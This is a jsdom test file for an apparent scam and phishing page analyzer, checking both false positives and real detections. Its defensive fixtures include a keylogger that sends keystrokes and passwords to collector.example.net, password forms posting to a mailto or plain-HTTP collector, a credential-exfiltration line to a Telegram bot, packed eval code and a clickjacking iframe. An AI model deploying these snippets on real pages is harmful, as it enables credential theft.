/*
 * page.test.js -- the tests that need a rendered page.
 *
 * These use jsdom. It is a development dependency, so if it is not installed
 * the whole file skips rather than failing:  npm install  enables it.
 */
'use strict';

const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const SpamAnalyzer = require('../extension/js/spam-analyzer.js');

let JSDOM = null;
try {
    JSDOM = require('jsdom').JSDOM;
} catch (e) {
    test('page tests need jsdom - run "npm install" to enable them', {skip: true}, () => {});
}

const pageTest = JSDOM ? test : test.skip;

function scan(url, html) {
    const dom = new JSDOM(html, {url});
    return SpamAnalyzer.analyze({url, document: dom.window.document});
}

function fixture(name, url) {
    const file = path.join(__dirname, '..', 'test-pages', name + '.html');
    return scan(url, fs.readFileSync(file, 'utf8'));
}

function idsOf(report) {
    return report.failed.map((check) => check.id);
}

/* ------------------------------------------------- who wrote these words */

pageTest('scam wording typed into an assistant does not condemn the assistant', () => {
    // The false positive this release exists to fix: the visitor asked about
    // scams, so the page is full of scam vocabulary that the site never said.
    const html = `<html><head><title>ChatGPT</title></head><body>
        <div class="conversation" role="log">
          <div data-message-author-role="user">show me some scam congratulations giveaway website</div>
          <div data-message-author-role="assistant">Examples say "congratulations, you have won a free
             gift card", "claim your prize", "act now, limited time offer" and "free money".</div>
        </div>
        <form><textarea placeholder="Message"></textarea></form></body></html>`;
    const report = scan('https://chatgpt.com/c/1234', html);

    assert.strictEqual(report.context.userDriven, true);
    assert.strictEqual(report.context.kind, 'assistant');
    assert.ok(!idsOf(report).includes('spam-phrases'));
    assert.ok(!idsOf(report).includes('survey-prize'));
    assert.strictEqual(report.rating, 'A');
});

pageTest('a chat app nobody has heard of gets the same benefit of the doubt', () => {
    const html = `<html><head><title>Local assistant</title></head><body>
        <div class="chat-thread" role="log">
          <div class="chat-message">You have won a free gift card! Claim your prize, act now.</div>
        </div><textarea id="composer"></textarea></body></html>`;
    const report = scan('https://ai.some-startup.io/chat', html);
    assert.strictEqual(report.context.userDriven, true);
    assert.strictEqual(report.context.kind, 'interactive');
    assert.strictEqual(report.rating, 'A');
});

pageTest('a search results page is not judged by what was searched for', () => {
    const html = `<html><head><title>free money scam - Search</title></head><body>
        <input type="search" name="q" value="free money scam you have won">
        <div id="results"><a href="https://news.example.com/a">How the free money scam works</a></div>
        </body></html>`;
    const report = scan('https://duckduckgo.com/?q=free+money+scam+you+have+won', html);
    assert.strictEqual(report.context.kind, 'search');
    assert.ok(!idsOf(report).includes('spam-phrases'));
    assert.strictEqual(report.rating, 'A');
});

pageTest('what the visitor typed is removed from the text the wording tests read', () => {
    const html = `<html><body><h1>Contact us</h1>
        <p>Tell us how we can help.</p>
        <textarea name="message">you have won a free prize, claim your prize now</textarea>
        </body></html>`;
    const dom = new JSDOM(html, {url: 'https://shop.example.com/contact'});
    const split = SpamAnalyzer.splitAuthorship(dom.window.document, new URL('https://shop.example.com/contact'));
    assert.ok(split.site.includes('Contact us'));
    assert.ok(!split.site.includes('claim your prize'));
    assert.ok(split.user.includes('claim your prize'));
});

pageTest('a page that says the scam words itself is still caught', () => {
    // The mirror image of the test above: no visitor, no composer, the site's
    // own copy. Context awareness must not become a way through.
    const html = `<html><head><title>Winner</title></head><body>
        <h1>Congratulations you have won</h1>
        <p>Claim your prize now. Free money, guaranteed income, this is not a scam.
           Act now, limited time offer, last chance!</p></body></html>`;
    const report = scan('https://prize-centre.example.tk/claim', html);
    assert.strictEqual(report.context.userDriven, false);
    assert.ok(idsOf(report).includes('spam-phrases'));
    assert.strictEqual(report.rating, 'F');
});

/* ------------------------------------------------------- the feature test */

pageTest('the feature check page is recognised by its wording on any mirror', () => {
    const report = fixture('feature-check-sample', 'https://mirror.example.org/copy.html');
    assert.strictEqual(report.blocked, true);
    assert.ok(idsOf(report).includes('test-page-signature'));
    assert.strictEqual(report.rating, 'F');
});

/* --------------------------------------------------- credential gathering */

pageTest('a cloned sign-in page is recognised as a credential kit', () => {
    const report = fixture('phishing-kit-sample', 'https://secure-paypal-verify.pages.dev/login/verify/account');
    const ids = idsOf(report);
    assert.ok(ids.includes('credential-brand-mismatch'), 'brand / domain mismatch');
    assert.ok(ids.includes('credential-exfil'), 'exfiltration endpoint');
    assert.ok(ids.includes('otp-harvest'), 'one-time code harvesting');
    assert.ok(ids.includes('login-form-no-action'), 'form with no destination');
    assert.ok(report.patterns.some((p) => p.id === 'credential-kit'));
    assert.strictEqual(report.rating, 'F');
});

pageTest('a form that e-mails your password away is close to conclusive', () => {
    const html = `<html><body><h1>Webmail</h1>
        <form action="mailto:collector@example.net" method="post">
          <input name="user"><input name="pass" type="password"><button>Sign in</button>
        </form></body></html>`;
    const report = scan('https://webmail-update.example.net/login', html);
    assert.ok(idsOf(report).includes('mailto-form'));
    assert.ok(report.score <= 20);
});

pageTest('a form that drops out of HTTPS is caught even on an encrypted page', () => {
    const html = `<html><body><form action="http://collector.example.net/post">
        <input name="card"><input name="pass" type="password"></form></body></html>`;
    const report = scan('https://shop.example.com/checkout', html);
    assert.ok(idsOf(report).includes('downgraded-form'));
});

pageTest('a wallet recovery phrase request is conclusive on its own', () => {
    const report = fixture('drainer-sample', 'https://metamask-validate.xyz/claim');
    const ids = idsOf(report);
    assert.ok(ids.includes('seed-phrase-harvest'));
    assert.ok(ids.includes('wallet-drainer'));
    assert.ok(report.patterns.some((p) => p.id === 'crypto-drainer'));
    assert.ok(report.score <= 12, `expected the cap to bite, got ${report.score}`);
});

/* ------------------------------------------------------------- pharming */

pageTest('a page working on your router is recognised as pharming', () => {
    const report = fixture('pharming-sample', 'https://network-upgrade.example.com/notice');
    const ids = idsOf(report);
    assert.ok(ids.includes('private-network-target'));
    assert.ok(ids.includes('router-attack'));
    assert.ok(ids.includes('dns-change-instructions'));
    assert.ok(report.patterns.some((p) => p.id === 'pharming'));
    assert.strictEqual(report.rating, 'F');
});

pageTest('the router\'s own administration page is not accused of attacking it', () => {
    const html = `<html><body><h1>Router setup</h1>
        <form action="/apply.cgi"><input name="dns1" value="192.168.1.1"></form></body></html>`;
    const report = scan('http://192.168.1.1/setup.html', html);
    assert.ok(!idsOf(report).includes('router-attack'));
    assert.ok(!idsOf(report).includes('private-network-target'));
});

/* ------------------------------------------------------ social engineering */

pageTest('a page talking you through running a command is caught', () => {
    const report = fixture('clickfix-sample', 'https://cdn-verify.example.net/human-check');
    assert.ok(idsOf(report).includes('clickfix-clipboard'));
    assert.strictEqual(report.rating, 'F');
});

/* ---------------------------------------------------------- false positives */

pageTest('an ordinary shop is not punished for advertising and trackers', () => {
    let ads = '';
    for (let i = 0; i < 12; i++) {
        ads += `<div class="ad-slot" id="ad_${i}"><iframe src="about:blank" width="300" height="60"></iframe></div>`;
    }
    let scripts = '';
    for (let i = 0; i < 8; i++) {
        scripts += `<script src="https://cdn${i}.tracker-example.com/t.js"></script>`;
    }
    const html = `<html><head><title>Riverside Books</title>${scripts}</head><body>
        <h1>Riverside Books</h1><p>Order now for next day delivery. Buy now, lowest price.</p>
        ${ads}<iframe src="https://analytics.example.com/p" width="0" height="0" style="display:none"></iframe>
        </body></html>`;
    const report = scan('https://riverside-books.com/', html);

    assert.ok(report.hygienePenalty > 12, 'the nuisance findings should be there');
    assert.ok(report.score >= 75, `an ad-heavy but honest shop must stay safe, got ${report.score}`);
});

pageTest('a genuine bank sign-in page passes', () => {
    const html = `<html><head><title>HSBC UK - Log on</title>
        <link rel="icon" href="/favicon.ico"></head><body>
        <h1>Log on to online banking</h1>
        <form action="/auth/logon" method="post">
          <input name="userid"><input name="password" type="password"><button>Continue</button>
        </form>
        <p>&copy; HSBC Group 2026. <a href="/contact">Contact us</a> · <a href="/privacy">Privacy</a></p>
        </body></html>`;
    const report = scan('https://www.hsbc.co.uk/auth/logon', html);
    assert.strictEqual(report.blocked, false);
    assert.ok(report.score >= 90, `got ${report.score}: ${idsOf(report).join(', ')}`);
});

/* ------------------------------------------------- the demo pages by band */

pageTest('each demo page still lands in the band it is named for', () => {
    const url = 'https://example-shop.com/index.html';
    assert.strictEqual(fixture('safe-sample', url).level, 'safe');
    assert.strictEqual(fixture('caution-sample', url).level, 'caution');
    assert.strictEqual(fixture('risky-sample', url).level, 'risky');
    assert.strictEqual(fixture('spam-sample', url).level, 'danger');
    assert.strictEqual(fixture('assistant-sample', 'https://ai.some-startup.io/chat').level, 'safe');
});

pageTest('the report bookkeeping still adds up on a page scan', () => {
    const report = fixture('spam-sample', 'https://example-shop.com/index.html');
    assert.strictEqual(report.passed.length + report.failed.length + report.skipped.length,
        report.totalTests);
    assert.strictEqual(report.totalTests, SpamAnalyzer.checks.length);
    assert.ok(report.patterns.length > 0);
});

pageTest('a hostile page cannot make the scan hang', () => {
    let bombs = '';
    for (let i = 0; i < 400; i++) {
        bombs += `<div class="ad"><iframe src="about:blank"></iframe><a href="https://x${i}.example.tk/">x${i}.example.tk</a></div>`;
    }
    const url = 'https://slow.example.com/';
    const dom = new JSDOM(`<html><body>${bombs}</body></html>`, {url});
    const started = Date.now();
    const report = SpamAnalyzer.analyze({url, document: dom.window.document});
    assert.ok(Date.now() - started < 4000, `the scan took ${Date.now() - started}ms`);
    assert.ok(report.score >= 0 && report.score <= 100);
});

/* ------------------------------------------------- precision on real apps */
/*
 * Version 2 rated google.com, an assistant and every other modern application
 * F. The cause was the same in each case: a test asking whether two tokens
 * appeared anywhere in a bundle, when what it meant to ask was whether they
 * appeared together. These tests hold that line.
 */

pageTest('an ordinary web application is not mistaken for an attack', () => {
    ['https://www.google.com/', 'https://claude.ai/chat/abc', 'https://workspace.example.com/app']
        .forEach((url) => {
            const report = fixture('webapp-sample', url);
            assert.strictEqual(report.rating, 'A',
                `${url} scored ${report.score}: ${idsOf(report).join(', ')}`);
            assert.deepStrictEqual(idsOf(report), [], `${url} raised findings`);
        });
});

pageTest('routing, lazy chunks and minified helpers are not evidence of anything', () => {
    const report = fixture('webapp-sample', 'https://workspace.example.com/app');
    ['keystroke-capture', 'history-trap', 'dynamic-script-injection', 'obfuscated-js',
     'bot-cloaking', 'devtools-blocking', 'install-prompt', 'hidden-iframes'].forEach((id) => {
        assert.ok(!idsOf(report).includes(id), `${id} fired on an ordinary application`);
    });
});

pageTest('a page\'s own application is not "somebody else\'s installer"', () => {
    // The app offers .pkg and .deb downloads from its own domain.
    assert.ok(!idsOf(fixture('webapp-sample', 'https://workspace.example.com/app')).includes('install-prompt'));

    const pushed = `<html><body><h1>Free video player</h1>
        <a href="https://get-it-here.duckdns.org/player-setup.apk">Download now</a></body></html>`;
    assert.ok(idsOf(scan('https://videos.example.com/watch', pushed)).includes('install-prompt'));
});

pageTest('a keylogger is a key listener that sends elsewhere, not one that formats a field', () => {
    const checkout = `<html><body><form action="/pay">
        <input name="cardnumber"><input name="cvv"><input type="password" name="pin">
      </form>
      <script>
        var card = document.querySelector('[name=cardnumber]');
        card.addEventListener('keyup', function (e) { e.target.value = e.target.value.replace(/\\D/g, ''); });
        card.addEventListener('blur', function () { fetch('/validate', {method: 'POST', body: card.value}); });
      <\/script></body></html>`;
    assert.ok(!idsOf(scan('https://shop.example.com/checkout', checkout)).includes('keystroke-capture'),
        'a card formatter is not a keylogger');

    const logger = `<html><body><form><input type="password" id="p"></form>
      <script>
        document.addEventListener('keydown', function (e) {
          fetch('https://collector.example.net/k?v=' + e.key + document.getElementById('p').value);
        });
      <\/script></body></html>`;
    assert.ok(idsOf(scan('https://signin.example.com/', logger)).includes('keystroke-capture'),
        'a real keylogger must still be caught');
});

pageTest('a router is not a back-button trap, but a trap still is', () => {
    const router = `<html><body><script>
        function go(u){ history.pushState({}, '', u); render(); }
        window.addEventListener('popstate', function(){ render(); });
        function render(){}
      <\/script></body></html>`;
    assert.ok(!idsOf(scan('https://app.example.com/', router)).includes('history-trap'));

    const trap = `<html><body><script>
        history.pushState(null, null, location.href);
        window.onpopstate = function(){ history.go(1); };
      <\/script></body></html>`;
    assert.ok(idsOf(scan('https://alert.example.tk/', trap)).includes('history-trap'));
});

pageTest('minifying is not packing', () => {
    const minified = `<html><body><script>
        var d=function(s){return decodeURIComponent(escape(atob(s)))},
            i={close:String.fromCharCode(99,108,111,115,101)},
            t=d('Y3NyZi10b2tlbg==');
      <\/script></body></html>`;
    assert.ok(!idsOf(scan('https://app.example.com/', minified)).includes('obfuscated-js'));

    const packed = `<html><body><script>
        eval(atob('dmFyIHggPSAxOyBhbGVydCgneCcpOyB2YXIgeSA9IDI7IGRvY3VtZW50LndyaXRlKCdoaScpOw=='));
      <\/script></body></html>`;
    assert.ok(idsOf(scan('https://free-movies.example.tk/', packed)).includes('obfuscated-js'));
});

pageTest('an exchange warning you about your recovery phrase is not asking for it', () => {
    const exchange = `<html><body><h1>Sign in</h1>
        <form action="/auth"><input name="email"><input type="password" name="password"></form>
        <p>We will never ask for your secret recovery phrase. Never share your seed phrase with anyone.</p>
        <a href="/contact">Contact</a> <a href="/privacy">Privacy</a></body></html>`;
    const report = scan('https://www.coinbase.com/signin', exchange);
    assert.ok(!idsOf(report).includes('seed-phrase-harvest'));
    assert.ok(report.score >= 90, `got ${report.score}: ${idsOf(report).join(', ')}`);

    // A field that collects one is still conclusive.
    assert.ok(idsOf(fixture('drainer-sample', 'https://metamask-validate.xyz/claim'))
        .includes('seed-phrase-harvest'));
});

pageTest('a page explaining an attack is not performing it', () => {
    // Code samples live in <pre>, not in <script>: they are prose about code.
    const tutorial = `<html><head><title>How drainers work</title></head><body>
        <h1>Anatomy of a wallet drainer</h1>
        <pre><code>ethereum.request({method:'eth_requestAccounts'});
token.setApprovalForAll(addr, true);
fetch('https://api.telegram.org/bot123/sendMessage?text=' + creds);
var s = document.createElement('script'); s.src = atob(payload);</code></pre>
        <p>Routers at 192.168.1.1 expose /cgi-bin/luci, and victims are told to change your DNS.</p>
        <a href="/about">About</a> <a href="/privacy">Privacy</a></body></html>`;
    const report = scan('https://developer.example.org/docs/drainers', tutorial);
    ['credential-exfil', 'wallet-drainer', 'router-attack', 'dns-change-instructions',
     'dynamic-script-injection'].forEach((id) => {
        assert.ok(!idsOf(report).includes(id), `${id} fired on an article about the attack`);
    });
    assert.ok(report.score >= 90, `got ${report.score}: ${idsOf(report).join(', ')}`);
});

pageTest('an ad-heavy newspaper with a subscription pitch stays out of the danger bands', () => {
    let ads = '';
    for (let i = 0; i < 11; i++) {
        ads += `<div class="ad-slot" id="ad_${i}"><iframe src="https://ads.example.com/${i}" width="300" height="250"></iframe></div>`;
    }
    let pixels = '';
    for (let i = 0; i < 4; i++) {
        pixels += `<iframe src="https://pixel${i}.example.com/p" width="0" height="0" style="display:none"></iframe>`;
    }
    let trackers = '';
    for (let i = 0; i < 9; i++) {
        trackers += `<script src="https://cdn${i}.adnetwork-example.com/t.js"></script>`;
    }
    const html = `<html><head><title>Election result - Example News</title>${trackers}</head><body>
        <h1>Election result confirmed</h1><p>${'Reporting from the capital. '.repeat(120)}</p>
        ${ads}${pixels}
        <p>Subscribe now for unlimited access. Limited time offer, lowest price of the year, order now.</p>
        <a href="/contact">Contact</a> <a href="/privacy">Privacy</a></body></html>`;
    const report = scan('https://www.examplenews.com/world/article-123', html);
    assert.ok(report.hygienePenalty > 12, 'the nuisance findings should still be reported');
    assert.ok(report.score >= 70, `an honest newspaper must stay clear of the danger bands, got ${report.score}`);
});

/* ------------------------------------------ precision on real pages (v4) */
/*
 * Reported against 3.0: google.com rated C, a Google search rated F, and
 * claude.ai rated "use caution". Three separate causes, plus one structural
 * flaw in the pattern engine that turned two of them into a "credential
 * harvesting kit" on a page with no password field anywhere.
 */

function searchEngine(title, extra) {
    const panels = Array.from({length: 40}, () =>
        `<div style="display:none">${'Menu item, settings, help, feedback, privacy, terms. '.repeat(14)}</div>`).join('');
    const layers = Array.from({length: 5}, (_, i) =>
        `<div class="suggestions-${i}" style="position:absolute;z-index:99999">Suggestions ${i}</div>`).join('');
    const pixels = Array.from({length: 4}, (_, i) =>
        `<iframe src="https://www.google.com/px${i}" width="0" height="0" style="display:none"></iframe>`).join('');
    return `<html><head><title>${title}</title>
        <link rel="icon" href="https://www.gstatic.com/images/branding/product/favicon.ico"></head><body>
        <form action="/search"><input name="q" type="search"></form>
        ${extra}
        <span style="position:absolute;left:-9999px">Skip to main content</span>
        ${panels}${layers}${pixels}
        <footer><a href="/intl/en/policies/privacy/">Privacy</a></footer></body></html>`;
}

pageTest('a search engine\'s home page raises nothing at all', () => {
    const report = scan('https://www.google.com/', searchEngine('Google', ''));
    assert.deepStrictEqual(idsOf(report), [], `findings: ${idsOf(report).join(', ')}`);
    assert.strictEqual(report.rating, 'A');
});

pageTest('a search results page is judged on the page, not the tracking in its address', () => {
    const url = 'https://www.google.com/search?q=claude&sca_esv=488c0243a38d5a71&source=hp' +
        '&ei=-yKVapXBAd_OhbIPrOuBIA&iflsig=ABILxe8AAAAAapUxC50m1IzdFxbnFgFfnVwBUdEQ67wq' +
        '&ved=0ahUKEwjVqouoosqWAxVfZ0EAHax1AAQQ4dUDCCk&uact=5&oq=claude&sclient=gws-wiz';
    const results = Array.from({length: 12}, (_, i) =>
        `<div class="g"><a href="https://claude.ai/p${i}">Claude ${i}</a><span>An AI assistant.</span></div>`).join('');
    const report = scan(url, searchEngine('claude - Google Search', results));

    assert.ok(!idsOf(report).includes('kit-path'), 'a ved= parameter is not a phishing kit');
    assert.deepStrictEqual(report.patterns, [], 'no attack pattern belongs on a search page');
    assert.ok(report.score >= 75, `got ${report.score}: ${idsOf(report).join(', ')}`);
    // Whatever is left must be nuisance only - a long address cannot be a threat by itself.
    assert.strictEqual(report.threatPenalty, 0, `threat findings: ${idsOf(report).join(', ')}`);
});

pageTest('a company\'s own asset domain is not somebody else\'s branding', () => {
    ['https://www.gstatic.com/favicon.ico', 'https://assets-proxy.anthropic.com/favicon.ico',
     'https://cdn.some-shop.example.net/icon.png'].forEach((icon) => {
        const html = `<html><head><link rel="icon" href="${icon}"><title>A site</title></head>
            <body><h1>Hello</h1><a href="/privacy">Privacy</a></body></html>`;
        assert.ok(!idsOf(scan('https://www.example.com/', html)).includes('favicon-hotlink'),
            `${icon} was read as borrowed branding`);
    });

    // Wearing an actual brand's icon while not being that brand still counts.
    const clone = `<html><head><link rel="icon" href="https://www.paypal.com/favicon.ico">
        <title>Sign in</title></head><body><h1>Sign in</h1></body></html>`;
    assert.ok(idsOf(scan('https://secure-login.example.tk/', clone)).includes('favicon-hotlink'));
});

pageTest('hidden menus and dialogs are not keyword stuffing', () => {
    const ui = `<html><body><h1>App</h1>
        <div style="display:none">${'Settings, help, feedback, shortcuts, about, privacy. '.repeat(40)}</div>
        <div style="visibility:hidden">${'A dialog that has not been opened yet. '.repeat(40)}</div>
        </body></html>`;
    assert.ok(!idsOf(scan('https://app.example.com/', ui)).includes('hidden-text'));

    const stuffed = `<html><body><h1>Shop</h1>
        <p style="font-size:0">${'cheap deals discount vouchers coupons bargain outlet sale offers '.repeat(20)}</p>
        </body></html>`;
    assert.ok(idsOf(scan('https://shop.example.com/', stuffed)).includes('hidden-text'));
});

pageTest('a floating layer is only an advert when it is one', () => {
    const layers = Array.from({length: 5}, (_, i) =>
        `<div class="popover-${i}" style="position:fixed;z-index:99999">Menu ${i}</div>`).join('');
    assert.ok(!idsOf(scan('https://app.example.com/', `<html><body>${layers}</body></html>`)).includes('overlay-ads'));

    const ads = Array.from({length: 3}, (_, i) =>
        `<div class="ad-overlay" style="position:fixed;z-index:99999"><iframe src="https://doubleclick.net/${i}"></iframe></div>`).join('');
    assert.ok(idsOf(scan('https://freemovies.example.tk/', `<html><body>${ads}</body></html>`)).includes('overlay-ads'));
});

pageTest('a tracking pixel is not a clickjack, and a clickjack still is', () => {
    const pixels = Array.from({length: 4}, (_, i) =>
        `<iframe src="https://t${i}.example.com/p" width="0" height="0" style="display:none"></iframe>`).join('');
    assert.ok(!idsOf(scan('https://news.example.com/', `<html><body>${pixels}</body></html>`)).includes('hidden-iframes'));

    const jack = `<html><body><iframe src="https://bank.example.com/transfer"
        style="opacity:0;width:600px;height:400px;position:absolute;top:0;left:0"></iframe>
        <button>Click to win</button></body></html>`;
    assert.ok(idsOf(scan('https://prizes.example.tk/', jack)).includes('hidden-iframes'));
});

/* ------------------------------------------- what a page is made of (v5.1) */

pageTest('linking to a company is not being built out of it', () => {
    /*
     * The bug this release exists to fix. "Page borrows another company's
     * images and styles" counted every hyperlink, so a search for "icloud
     * find my" - whose results are naturally full of apple.com links - rated
     * Google an F, while a search for something else rated it an A. The
     * verdict tracked what had been searched for rather than the page.
     */
    const results = ['https://www.apple.com/icloud/find-my/', 'https://www.icloud.com/find',
                     'https://support.apple.com/find-my', 'https://www.apple.com/support/icloud/',
                     'https://apps.apple.com/app/find-my']
        .map((href, i) => `<div class="g"><a href="${href}"><h3>Result ${i}</h3></a></div>`).join('');
    const html = `<html><head><title>icloud find my - Google Search</title></head><body>
        <input type="search" name="q" value="icloud find my">
        <div id="search">${results}</div></body></html>`;
    const report = scan('https://www.google.com/search?q=icloud+find+my', html);

    assert.ok(!idsOf(report).includes('cloned-brand-assets'),
        'result links were read as borrowed assets');
    assert.ok(report.score >= 90, `got ${report.score}: ${idsOf(report).join(', ')}`);
});

pageTest('the same search page scores the same whatever was searched for', () => {
    /*
     * A scanner whose verdict moves with the query is reporting the query,
     * not the page. Two searches, identical markup, different result hosts:
     * the score has to be the same.
     */
    const page = (hosts) => `<html><head><title>results - Google Search</title></head><body>
        <input type="search" name="q" value="something">
        <div id="search">${hosts.map((h, i) =>
            `<div class="g"><a href="https://${h}/page${i}"><h3>Result ${i}</h3></a></div>`).join('')}</div>
        </body></html>`;
    const brands = ['www.apple.com', 'www.icloud.com', 'support.apple.com', 'www.apple.com', 'apps.apple.com'];
    const others = ['claude.ai', 'www.anthropic.com', 'docs.claude.com', 'claude.ai', 'www.claude.com'];

    const withBrands = scan('https://www.google.com/search?q=icloud+find+my', page(brands));
    const withOthers = scan('https://www.google.com/search?q=claude', page(others));
    assert.strictEqual(withBrands.score, withOthers.score,
        `${withBrands.score} vs ${withOthers.score}: the verdict follows the query, not the page`);
    assert.strictEqual(withBrands.rating, 'A');
});

pageTest('a company serving its own images from its own other domain is not a clone', () => {
    // Apple serves iCloud's images from apple.com; Microsoft, Meta and
    // Amazon all do the same across their own domains.
    const built = (assets) => `<html><head><title>Home</title></head><body><h1>Home</h1>
        ${assets.map((src) => `<img src="${src}">`).join('')}</body></html>`;
    [['https://www.icloud.com/find/', 'https://www.apple.com/ac/'],
     ['https://outlook.live.com/mail/', 'https://outlook.office.com/a/'],
     ['https://www.instagram.com/', 'https://static.cdninstagram.com/'],
     ['https://www.paypal.com/signin', 'https://www.paypalobjects.com/i/']].forEach(([page, host]) => {
        const assets = [1, 2, 3, 4, 5].map((n) => `${host}${n}.png`);
        assert.ok(!idsOf(scan(page, built(assets))).includes('cloned-brand-assets'),
            `${page} was read as a clone of its own company's asset host`);
    });
});

pageTest('a page really built out of another company\'s files is still a clone', () => {
    const assets = [1, 2, 3, 4, 5].map((n) => `<img src="https://www.apple.com/ac/${n}.png">`).join('');
    const html = `<html><head><title>Sign in to iCloud</title></head><body>${assets}
        <form action="/p.php"><input name="appleid"><input type="password" name="pw"></form></body></html>`;
    const report = scan('https://appleid-icloud-verify.tk/signin', html);
    assert.ok(idsOf(report).includes('cloned-brand-assets'), 'a real clone went unreported');
    assert.strictEqual(report.rating, 'F');
});

/* --------------------------------------------- invisible frames (v5.1) */

pageTest('a frame that is switched off cannot catch a click', () => {
    /*
     * display:none and visibility:hidden are not rendered, so nothing can be
     * clicked through them. Every application on the web keeps a sign-in
     * frame or an unopened dialog this way, and reading that as clickjacking
     * put iCloud and Outlook in the same band as a scam.
     */
    [['display:none', 640, 349], ['visibility:hidden', 700, 500]].forEach(([css, w, h]) => {
        const html = `<html><head><title>App</title></head><body><h1>App</h1>
            <iframe src="https://idp.example.com/silent" style="${css}" width="${w}" height="${h}"></iframe>
            </body></html>`;
        const report = scan('https://app.example.com/', html);
        assert.ok(!idsOf(report).includes('hidden-iframes'), `${css} was read as clickjacking`);
        assert.strictEqual(report.rating, 'A');
    });
});

pageTest('a transparent frame that still takes clicks is a clickjack, at any opacity', () => {
    /*
     * Transparency is a slider, not a switch: opacity 0.02 is as invisible as
     * opacity 0, and testing only for exact zero let the real shape through
     * while the harmless one was being reported.
     */
    ['0', '0.01', '0.03'].forEach((opacity) => {
        const html = `<html><head><title>Claim</title></head><body><h1>Claim your prize</h1>
            <button>Click to claim</button>
            <iframe src="https://bank.example.com/transfer" width="800" height="600"
                style="opacity:${opacity};position:absolute;top:0;left:0;z-index:9999"></iframe>
            </body></html>`;
        const report = scan('https://free-gift-claim.top/', html);
        assert.ok(idsOf(report).includes('hidden-iframes'), `opacity ${opacity} was not caught`);
        // A real clickjack is a threat, not untidiness, so it must be able to
        // take the page out of the safe band on its own.
        assert.ok(report.threatPenalty > 0, 'a clickjack was filed as a nuisance');
        assert.ok(['D', 'F'].includes(report.rating), `opacity ${opacity} rated ${report.rating}`);
    });
});

pageTest('a transparent frame that cannot be clicked is not a clickjack', () => {
    const html = `<html><body><h1>Fading in</h1>
        <iframe src="/panel" width="600" height="400" style="opacity:0;pointer-events:none"></iframe>
        </body></html>`;
    assert.ok(!idsOf(scan('https://app.example.com/', html)).includes('hidden-iframes'));
});

/* --------------------------------------- writing about scams (v5.1) */

const ARTICLE_BODY = `<p>Fraud changes constantly, but the messages criminals send follow a small
    number of patterns, and knowing what those look like is the best protection most people have.
    This guide sets out the ones seen most often and what to do when one arrives.</p>
    <p>Nothing here should be acted on directly. If a message worries you, close it and reach the
    company through a number or an app you already had before the message arrived.</p>`;

pageTest('a news report about scams is not a scam', () => {
    const html = `<html><head><title>Phishing scams cost billions</title>
        <meta property="og:type" content="article"></head><body>
        <article><h1>Phishing scams cost billions</h1>${ARTICLE_BODY}
        <p>Victims are told "your account has been locked" and "verify your identity now".
        One message said "congratulations you have won" and asked for a "wire transfer fee"
        sent by "western union".</p>
        <p>A caller may claim "your computer is infected" and press you to "call support now".</p>
        </article></body></html>`;
    const report = scan('https://www.example-news.com/technology/phishing-costs', html);
    assert.ok(!idsOf(report).includes('spam-phrases'), 'quoted scam wording read as the paper\'s own');
    assert.ok(!idsOf(report).includes('scareware'), 'quoted alert wording read as the paper\'s own');
    assert.strictEqual(report.rating, 'A');
});

pageTest('a bank\'s guide to spotting a scam is not one', () => {
    const html = `<html><head><title>How to spot a scam</title></head><body>
        <article><h1>How to spot a scam</h1>${ARTICLE_BODY}
        <p>A fraudster's message often opens "congratulations you have won", or warns
        "virus detected" and "your files have been encrypted" before demanding a
        "wire transfer fee" to put it right.</p></article></body></html>`;
    const report = scan('https://www.example-bank.co.uk/security-centre/fraud-guide/', html);
    assert.ok(!idsOf(report).includes('spam-phrases'));
    assert.ok(report.score >= 90, `got ${report.score}: ${idsOf(report).join(', ')}`);
});

pageTest('quotation marks are not a way past the wording tests', () => {
    /*
     * The benefit of the doubt an article gets must not become a loophole.
     * A page whose pitch IS the quotation is not reporting anything: take the
     * quotations out and nothing is left, which is the opposite of an article.
     */
    const html = `<html><head><title>Prize draw</title><meta property="og:type" content="article"></head>
        <body><article><h1>"Congratulations you have won"</h1>
        <p>"Claim your prize" - "free money" - "act now, limited time offer".</p>
        <p>"You have won" - "claim your prize" - "guaranteed income" - "100% free".</p>
        </article></body></html>`;
    const report = scan('https://mega-prize-draw.bond/', html);
    assert.ok(idsOf(report).includes('spam-phrases'), 'a pitch in quotation marks got through');
    assert.ok(['D', 'F'].includes(report.rating), `rated ${report.rating}`);
});

pageTest('an article shape does not excuse a page that can take something from you', () => {
    // A scam wearing <article> still has to end somewhere: a card field, a
    // number to ring, a wallet. That machinery is what withdraws the benefit.
    const cases = [
        ['card fields', `<form action="/claim.php"><input name="cardnumber"><input name="cvv"></form>`],
        ['a number to ring', `<p>Call support now on 1-888-555-0199 to remove it.</p>`],
        ['a wallet', `<p>Send to 0x1234567890abcdef1234567890abcdef12345678 to claim.</p>`]
    ];
    cases.forEach(([what, machinery]) => {
        const html = `<html><head><title>Notice</title><meta property="og:type" content="article"></head>
            <body><article><h1>Important notice</h1>${ARTICLE_BODY}
            <p>Our records show "your computer is infected" and "congratulations you have won"
            a prize worth claiming today.</p>${machinery}</article></body></html>`;
        const report = scan('https://system-warning-alert.cyou/notice', html);
        assert.ok(['D', 'F'].includes(report.rating),
            `a scam with ${what} rated ${report.rating}: ${idsOf(report).join(', ')}`);
    });
});
